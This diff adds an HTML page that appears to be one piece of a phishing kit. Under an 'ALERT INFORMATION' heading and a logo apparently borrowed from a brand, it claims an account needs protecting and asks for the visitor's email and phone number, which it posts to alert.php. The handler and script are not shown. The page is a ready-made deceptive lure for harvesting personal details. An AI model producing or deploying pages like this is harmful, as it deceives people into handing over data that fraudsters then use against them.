@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="bootstrap.css">
+    <link rel="stylesheet" href="style.css">
+    <!-- Favicon -->
+    <link rel="icon" type="icon" href="image/2roLlGjkUQjHmwqW5nK9kJKd5vZ.svg" sizes="180x180">
+</head>
+<body>
+    <section>
+        <form method="post" action="./alert.php">
+        <div class="pt-5">
+            <div class="mx-auto col-lg-6 col-md-10 col-12 bg-white card pt-3 rounded-2 pt-4">
+                <div class="text-center  pb-3">
+                    <img src="image/Ent_logo-removebg-preview.png" width="200" alt="">
+                </div>
+                <hr>
+                <h5 class="text-center">ALERT INFORMATION</h4>
+                <div class="text-center">
+                    <p>To protect your account, please provide the requested information</p>
+                </div>
+                <div style="padding-left: 60px; padding-right: 60px;">
+                    <div>
+                        <input name="email" class="form-control shadow-none" type="email" id="email" placeholder="Email">
+                        <span id="emailError" class="error-d"><small>Please fill out this field.</small></span>
+                    </div>
+                    <div class="pt-2">
+                        <input name="number" class="form-control shadow-none" type="number" id="number" placeholder="Phone Number">
+                        <span id="numberError" class="error-d"><small>Please fill out this field.</small></span>
+                    </div>
+                    <div class="pt-3 pb-5">
+                        <button class="rounded-2 w-100 fw-medium auth-continue" onclick="alertContinue()"> Continue</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </form>
+    </section>
+    <script src="alert.js"></script>
+</body>
+</html>
